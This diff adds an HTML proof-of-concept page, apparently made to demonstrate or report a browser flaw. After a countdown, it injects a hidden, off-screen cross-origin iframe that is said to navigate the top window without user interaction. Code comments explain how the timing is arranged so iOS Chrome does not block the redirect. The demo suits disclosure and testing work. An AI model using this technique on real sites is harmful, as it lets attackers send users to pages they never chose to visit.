@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Forced-redirect demo (3s idle, no interaction)</title>
+<style>
+  :root { color-scheme: light dark; }
+  * { box-sizing: border-box; }
+  body { margin:0; min-height:100vh; display:grid; place-items:center;
+    font: 16px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    text-align:center; padding:24px; }
+  .box { max-width:460px; }
+  h1 { font-size:1.15rem; margin:0 0 10px; }
+  p { opacity:.85; margin:.3rem 0; }
+  .count { font-size:3rem; font-weight:700; font-variant-numeric:tabular-nums; margin:14px 0 4px; }
+  .hint { font-size:.85rem; opacity:.6; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <h1>Cross-origin forced-redirect demo</h1>
+    <p><strong>Do not touch the screen.</strong></p>
+    <p>No tap, scroll, or key will occur. After a short idle delay the page injects a
+       non-sandboxed cross-origin iframe, which then navigates this top window by itself.</p>
+    <div class="count" id="count">3</div>
+    <p class="hint" id="hint">iframe injects when this reaches 0 — redirect is instant after that</p>
+  </div>
+<script>
+  // The 3s delay is ONLY on when we inject the iframe — a visible "idle, untouched"
+  // window for the camera. The redirect itself is NOT delayed: the child commits it
+  // synchronously inside its message handler (unchanged mechanism). Delaying the
+  // navigation itself with a timer would move it out of that context and iOS Chrome
+  // would block it — so the delay deliberately lives here, not in the child.
+  var n = 3;
+  var el = document.getElementById('count');
+  var tick = setInterval(function () {
+    n -= 1;
+    if (n <= 0) {
+      clearInterval(tick);
+      el.textContent = '0';
+      document.getElementById('hint').textContent = 'injecting iframe…';
+      var i = document.createElement('iframe');
+      i.src = "https://x-origin-redirect-demo.pages.dev/child/";
+      i.width = "1"; i.height = "1";
+      i.style = "position:absolute;left:-9999px;top:-9999px;border:0;";
+      document.body.appendChild(i);
+    } else {
+      el.textContent = String(n);
+    }
+  }, 1000);
+</script>
+</body>
+</html>
